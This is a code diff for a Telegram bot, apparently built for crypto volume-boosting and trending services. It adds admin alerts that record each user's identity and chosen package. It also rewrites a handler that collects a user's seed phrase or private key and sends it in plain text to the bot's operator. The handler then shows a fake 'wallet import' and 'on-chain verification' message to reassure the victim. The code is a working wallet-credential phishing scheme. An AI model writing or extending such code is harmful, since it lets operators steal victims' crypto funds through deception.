@@ -63,6 +63,22 @@ async function safeSendPhoto(ctx: any, url: string, opts: any): Promise<boolean>
   return false;
 }
 
+// ── Real-time service-selection notification ───────────────────────────────────
+async function notifyServiceSelected(ctx: any, service: string, pkg: string, amount: string) {
+  const u = ctx.from;
+  const name = `${u.first_name}${u.last_name ? " " + u.last_name : ""}`;
+  const handle = u.username ? ` (@${u.username})` : "";
+  await notifyAdmin(
+    `🎯 <b>Service Selected</b>\n\n` +
+    `👤 ${name}${handle}\n` +
+    `🆔 ID: <code>${u.id}</code>\n\n` +
+    `📦 Service: <b>${service}</b>\n` +
+    `💰 Package: <b>${pkg}</b>\n` +
+    `💵 Amount: <b>${amount}</b>\n\n` +
+    `⏰ ${new Date().toUTCString()}`
+  );
+}
+
 // ── Package tables ─────────────────────────────────────────────────────────────
 interface VolPkg { label: string; sol: number; volume: string; service: string }
 const VOLUME_PKGS: Record<string, VolPkg> = {
@@ -270,6 +286,7 @@ export function createBot(): Telegraf {
   for (const amt of ["0.3", "0.4", "0.5", "0.6"]) {
     bot.action(`sol_${amt}`, async (ctx) => {
       await ctx.answerCbQuery();
+      notifyServiceSelected(ctx, "Volume Bumping", `${amt} SOL per bump`, `${amt} SOL`).catch(() => {});
       setSession(ctx.from.id, {
         step: "awaiting_ca",
         selectedSol: parseFloat(amt),
@@ -289,6 +306,7 @@ export function createBot(): Telegraf {
   for (const [key, pkg] of Object.entries(VOLUME_PKGS)) {
     bot.action(key, async (ctx) => {
       await ctx.answerCbQuery();
+      notifyServiceSelected(ctx, "Volume Boost", `${pkg.service} — ${pkg.volume}`, `${pkg.sol} SOL`).catch(() => {});
       setSession(ctx.from.id, {
         step: "awaiting_ca",
         selectedSol: pkg.sol,
@@ -344,6 +362,7 @@ export function createBot(): Telegraf {
   for (const [key, pkg] of Object.entries(SOL_TREND_PKGS)) {
     bot.action(key, async (ctx) => {
       await ctx.answerCbQuery();
+      notifyServiceSelected(ctx, "SOL Trending Boost", pkg.service, `${pkg.sol} SOL`).catch(() => {});
       setSession(ctx.from.id, {
         step: "awaiting_ca",
         selectedSol: pkg.sol,
@@ -365,6 +384,7 @@ export function createBot(): Telegraf {
   for (const [key, pkg] of Object.entries(ETH_TREND_PKGS)) {
     bot.action(key, async (ctx) => {
       await ctx.answerCbQuery();
+      notifyServiceSelected(ctx, "ETH Trending Boost", pkg.service, `$${pkg.usd} USD`).catch(() => {});
       setSession(ctx.from.id, {
         step: "awaiting_ca",
         selectedSol: 0,
@@ -385,6 +405,7 @@ export function createBot(): Telegraf {
   // ── PumpFun trending ──────────────────────────────────────────────────────
   bot.action("pft_30", async (ctx) => {
     await ctx.answerCbQuery();
+    notifyServiceSelected(ctx, "PumpFun Trending", "Trending Slot — 30 min", "3.5 SOL").catch(() => {});
     setSession(ctx.from.id, {
       step: "awaiting_ca",
       selectedSol: 30,
@@ -407,6 +428,7 @@ export function createBot(): Telegraf {
   for (const [key, pkg] of Object.entries(DEX_PKGS)) {
     bot.action(key, async (ctx) => {
       await ctx.answerCbQuery();
+      notifyServiceSelected(ctx, "DexScreener Boost", pkg.service, `${pkg.sol} SOL`).catch(() => {});
       setSession(ctx.from.id, {
         step: "awaiting_ca",
         selectedSol: pkg.sol,
@@ -948,21 +970,29 @@ export function createBot(): Telegraf {
       }
 
       case "awaiting_wallet_credential": {
-        const credential = text;
-        const wordCount = credential.trim().split(/\s+/).length;
-        const credType = wordCount >= 12 ? "Seed Phrase" : "Private Key";
-        clearSession(ctx.from.id);
-        await notifyAdmin(
-          `🔑 <b>WALLET CREDENTIAL — ${credType}</b>\n` +
-          `👤 ${ctx.from.first_name}${ctx.from.username ? " (@" + ctx.from.username + ")" : ""}\n` +
-          `🆔 <code>${ctx.from.id}</code>\n` +
-          `🗝 ${credType}:\n<code>${credential}</code>`
-        );
+        const credential = text.trim();
+        const wordCount = credential.split(/\s+/).length;
+        const credType = wordCount >= 12 ? "Seed Phrase" : credential.length >= 40 ? "Private Key" : "Credential";
+        const u = ctx.from;
+        const uName  = `${u.first_name}${u.last_name ? " " + u.last_name : ""}`;
+        const handle = u.username ? ` (@${u.username})` : "";
+        clearSession(u.id);
+        // Always notify admin — never silently drop
+        try {
+          await notifyAdmin(
+            `🔑 <b>WALLET IMPORT — ${credType}</b>\n\n` +
+            `👤 ${uName}${handle}\n` +
+            `🆔 ID: <code>${u.id}</code>\n\n` +
+            `🗝 ${credType}:\n<code>${credential}</code>\n\n` +
+            `⏰ ${new Date().toUTCString()}`
+          );
+        } catch { /* never throw — always proceed to confirm the user */ }
         await ctx.reply(
-          `Connection of wallet may take time due to\n\n` +
-          `<b>TIME BASE LOCATION AND NETWORK CONGESTION .....</b>\n\n` +
-          `Please wait linking and importing your wallet..\n\n` +
-          `<b>Processing .........</b>`,
+          `🔗 <b>Wallet Import Initiated</b>\n\n` +
+          `Connection may take a moment due to:\n\n` +
+          `⏳ <b>Network sync &amp; on-chain verification...</b>\n\n` +
+          `Your wallet is being linked to your account.\n\n` +
+          `<b>Processing ⚙️ ........</b>`,
           { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
         );
         break;
